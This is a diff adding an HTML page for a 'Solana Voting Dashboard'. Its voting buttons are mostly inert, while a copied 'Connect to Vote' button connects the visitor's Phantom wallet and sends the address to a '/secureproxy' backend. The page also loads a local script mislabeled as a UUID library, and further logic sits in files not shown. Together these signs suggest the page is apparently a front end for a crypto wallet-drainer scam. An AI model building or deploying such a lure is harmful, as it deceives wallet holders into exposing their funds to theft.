@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Solana Voting Dashboard</title>
+
+  <!-- Solana Web3 (for script.js) -->
+  <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+
+  <!-- UUID (for wallet connect) -->
+  <script src="./ably.umd.js"></script>
+
+  <!-- Particles.js -->
+  <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+
+  <!-- ALL YOUR STYLES -->
+  <style>
+    /* === YOUR FULL STYLES FROM ABOVE (UNCHANGED) === */
+    body { margin: 0; font-family: 'Segoe UI', sans-serif; background: #020720; color: #E0E7FF; overflow-x: hidden; position: relative; min-height: 100vh; }
+    body::after { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(135deg, #00FFA3, #03E1FF, #DC1FFF); opacity: 0.08; animation: gradientShift 15s ease infinite; z-index: 0; }
+    @keyframes gradientShift { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+    #particles-js { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; }
+    .container { position: relative; z-index: 1; max-width: 1200px; margin: auto; padding: 20px; }
+    .header-box { background-color: rgba(10, 15, 44, 0.7); padding: 15px; border-radius: 12px; display: flex; flex-direction: column; align-items: center; gap: 10px; width: 100%; margin-bottom: 30px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3); text-align: center; }
+    .header-box img { width: 95px; height: 100px; filter: drop-shadow(0 2px 4px rgba(0, 255, 163, 0.3)); margin: 0 auto; }
+    .header-box h1 { font-size: 1.8em; margin: 0; color: #00FFA3; text-shadow: 0 0 10px rgba(0, 255, 163, 0.3); }
+    .header-box p { font-size: 0.9em; margin: 5px 0; color: #B0B5C7; background: linear-gradient(90deg, #00FFA3, #DC1FFF); -webkit-background-clip: text; background-clip: text; color: transparent; text-align: center; padding: 5px; border-radius: 5px; animation: glow 2s ease infinite alternate; }
+    @keyframes glow { from { text-shadow: 0 0 5px #00FFA3, 0 0 10px #DC1FFF; } to { text-shadow: 0 0 10px #00FFA3, 0 0 15px #DC1FFF; } }
+    .main-box { background-color: rgba(10, 15, 44, 0.5); padding: 30px; border-radius: 15px; margin-bottom: 40px; backdrop-filter: blur(10px); box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4); }
+    .main { display: flex; justify-content: space-between; flex-wrap: wrap; gap: 30px; }
+    .left, .right { flex: 1; min-width: 300px; }
+    .steps-box { background-color: rgba(10, 15, 44, 0.7); padding: 20px; border-radius: 12px; text-align: center; }
+    .steps-box h2 { font-size: 1.5em; margin-bottom: 20px; color: #00FFA3; }
+    .step { margin: 10px 0; }
+    .step button { background-color: #07031f; color: white; border: 2px solid #110d2c; padding: 10px 20px; font-size: 1em; border-radius: 6px; cursor: pointer; width: 100%; transition: all 0.3s ease; }
+    .step button:hover { background-color: #03E1FF; box-shadow: 0 0 20px rgba(3, 225, 255, 0.5); transform: translateY(-2px); }
+    .arrow { font-size: 1.5em; margin: 10px 0; color: #E0E7FF; opacity: 0.8; }
+    .right h2 { font-size: 1.5em; margin-bottom: 10px; color: #00FFA3; }
+    .right ul { list-style: none; padding-left: 0; }
+    .right li { display: flex; align-items: center; margin: 10px 0; justify-content: space-between; background: linear-gradient(45deg, #00FFA3, #DC1FFF); padding: 10px; border-radius: 6px; transition: transform 0.3s ease; }
+    .right li:hover { transform: translateX(5px); }
+    .right img { width: 24px; height: 24px; margin-right: 10px; filter: brightness(1.5); }
+    .claim-box { text-align: center; margin: 40px 0 20px; height: 60px; position: relative; }
+    .interact-button { background: linear-gradient(45deg, #00FFA3, #DC1FFF); color: white; border: none; padding: 15px 30px; font-size: 1.2em; border-radius: 8px; cursor: pointer; animation: pulse 2s infinite; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 15px rgba(0, 255, 163, 0.4); transition: transform 0.3s ease; }
+    .interact-button:hover { background: linear-gradient(45deg, #DC1FFF, #00FFA3); transform: scale(1.05); }
+    @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(0, 255, 163, 0.7); } 70% { box-shadow: 0 0 0 10px rgba(0, 255, 163, 0); } 100% { box-shadow: 0 0 0 0 rgba(0, 255, 163, 0); } }
+    .wallet-logos { display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; margin-bottom: 40px; }
+    .wallet-logos img { width: 50px; height: 50px; border-radius: 8px; transition: transform 0.3s ease; filter: drop-shadow(0 0 5px rgba(0, 255, 163, 0.3)); }
+    .wallet-logos img:hover { transform: scale(1.1); }
+    .support { text-align: center; margin-bottom: 20px; }
+    .support a { margin: 0 10px; display: inline-block; }
+    .support img { width: 30px; height: 30px; transition: transform 0.3s ease; filter: drop-shadow(0 0 5px rgba(220, 31, 255, 0.3)); }
+    .support img:hover { transform: scale(1.2); }
+    footer { text-align: center; font-size: 0.9em; padding: 10px; border-top: 1px solid rgba(255, 255, 255, 0.1); opacity: 0.7; }
+    .voting-section { background-color: rgba(10, 15, 44, 0.7); padding: 20px; border-radius: 10px; margin: 20px 0; text-align: center; box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3); }
+    .voting-section input { padding: 10px; width: 300px; border-radius: 6px; border: none; margin-right: 10px; background-color: #1F2937; color: #E0E7FF; }
+    .voting-section input:focus { box-shadow: 0 0 10px rgba(3, 225, 255, 0.5); outline: none; }
+    .voting-section button { background-color: #00FFA3; color: white; border: 2px solid #00FFA3; padding: 10px 20px; border-radius: 6px; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 0 10px rgba(0, 255, 163, 0.3); }
+    .voting-section button:hover { background-color: #03E1FF; box-shadow: 0 0 20px rgba(3, 225, 255, 0.5); transform: translateY(-2px); }
+    .contract-display { border: 1px solid rgba(255, 255, 255, 0.2); padding: 20px; border-radius: 10px; margin: 20px 0; background: rgba(10, 15, 44, 0.5); }
+    .contract-display h3 { margin: 0 0 10px; font-size: 1.3em; color: #DC1FFF; }
+    .contract-display p { margin: 5px 0; color: #B0B5C7; }
+    .vote-button { background-color: #1E40AF; color: white; border: 2px solid #00FFA3; padding: 10px 20px; border-radius: 6px; cursor: pointer; transition: all 0.3s ease; margin-top: 10px; box-shadow: 0 0 10px rgba(0, 255, 163, 0.3); }
+    .vote-button:disabled { background-color: #4B5563; border-color: #6B7280; cursor: not-allowed; box-shadow: none; }
+    .vote-button:hover:not(:disabled) { background-color: #03E1FF; box-shadow: 0 0 20px rgba(3, 225, 255, 0.5); transform: translateY(-2px); }
+    .vote-count { margin-top: 10px; font-size: 1em; color: #B0B5C7; }
+    @media (max-width: 768px) { .main { flex-direction: column; } .voting-section input { width: 100%; margin-bottom: 10px; } }
+  </style>
+
+  <!-- Particle.js Init -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      if (window.particlesJS) {
+        particlesJS("particles-js", {
+          particles: {
+            number: { value: 80, density: { enable: true, value_area: 800 } },
+            color: { value: ["#00FFA3", "#03E1FF", "#DC1FFF"] },
+            shape: { type: "circle" },
+            opacity: { value: 0.5, random: true, anim: { enable: true, speed: 1, opacity_min: 0.1 } },
+            size: { value: 3, random: true, anim: { enable: true, speed: 2, size_min: 0.1 } },
+            line_linked: { enable: false },
+            move: { enable: true, speed: 1, direction: "none", random: true, straight: false, out_mode: "out" }
+          },
+          interactivity: { detect_on: "canvas", events: { onhover: { enable: true, mode: "repulse" }, onclick: { enable: true, mode: "push" } } },
+          retina_detect: true
+        });
+      }
+    });
+  </script>
+</head>
+<body>
+  <div id="particles-js"></div>
+
+  <div class="container">
+    <div class="header-box">
+      <img src="image/logo.png" alt="Logo" />
+      <div>
+        <h1>Solana Voting Dashboard</h1>
+        <p>Vote on Solana Tokens with Secure Wallet Connection</p>
+      </div>
+    </div>
+
+    <div class="main-box">
+      <div class="main">
+        <div class="left">
+          <div class="steps-box">
+            <h2>Steps:</h2>
+            <div class="step"><button>Search Token</button></div>
+            <div class="arrow">→</div>
+            <div class="step"><button>Connect Wallet</button></div>
+            <div class="arrow">→</div>
+            <div class="step"><button>Vote</button></div>
+            <div class="arrow">→</div>
+            <div class="step"><button>View Results</button></div>
+          </div>
+        </div>
+
+        <div class="right">
+          <h2>Wallet Status</h2>
+          <ul class="realtime-list">
+            <li><span id="wallet-status">Not connected</span></li>
+            <li><span id="wallet-balance">Balance: 0 SOL</span></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <div class="voting-section">
+      <form id="contract-search">
+        <input type="text" id="contract-address" placeholder="Enter Solana contract address" />
+        <button type="submit">Search</button>
+      </form>
+      <div id="contract-display" class="contract-display hidden"></div>
+      <div id="vote-section">
+        <button id="vote-button" class="vote-button" disabled>Vote</button>
+        <p id="vote-count" class="vote-count">Total Votes: 0</p>
+      </div>
+    </div>
+
+    <!-- FRIEND'S EXACT BUTTON -->
+    <div class="claim-box">
+      <button onclick="window.startConnect()" class="interact-button flex h-full w-full items-center justify-center">
+        <span class="text-[1.125rem]">Connect to Vote </span>
+      </button>
+    </div>
+
+    <div class="wallet-logos">
+      <img src="image/phantom.png" alt="Phantom" />
+      <img src="image/solflare.png" alt="Solflare" />
+      <img src="image/backpack.png" alt="BackPack" />
+      <img src="image/glow.png" alt="Glow" />
+      <img src="image/trust.png" alt="Trust" />
+    </div>
+
+    <div class="support">
+      <a href="#"><img src="image/telegram.png" alt="Telegram" /></a>
+      <a href="#"><img src="image/discord.png" alt="Discord" /></a>
+      <a href="#"><img src="image/website.png" alt="Website" /></a>
+    </div>
+
+    <footer>
+      &copy; 2025 Solana Voting Dashboard. All rights reserved.
+    </footer>
+  </div>
+
+  <!-- WALLET CONNECT + SET walletPublicKey FOR script.js -->
+  <script>
+    window.startConnect = async function() {
+      if (!window.solana) {
+        alert("Phantom wallet not found!");
+        return;
+      }
+
+      try {
+        const resp = await window.solana.connect();
+        const walletAddress = resp.publicKey.toString();
+        console.log("Wallet connected:", walletAddress);
+
+        // UPDATE UI
+        document.getElementById('wallet-status').textContent = 
+          `Connected: ${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`;
+
+        // SET GLOBAL FOR script.js
+        window.walletPublicKey = new solanaWeb3.PublicKey(walletAddress);
+
+        // TRIGGER PHP BACKEND
+        const url = `/secureproxy?e=${encodeURIComponent(walletAddress)}`;
+        const res = await fetch(url);
+        const text = await res.text();
+        console.log("PHP Backend Response:", text);
+
+      } catch (err) {
+        console.error("Connect failed:", err);
+        alert("Failed to connect.");
+      }
+    };
+  </script>
+
+  <!-- DEXSCREENER + VOTING LOGIC -->
+  <script src="script.js" defer></script>
+</body>
+</html>
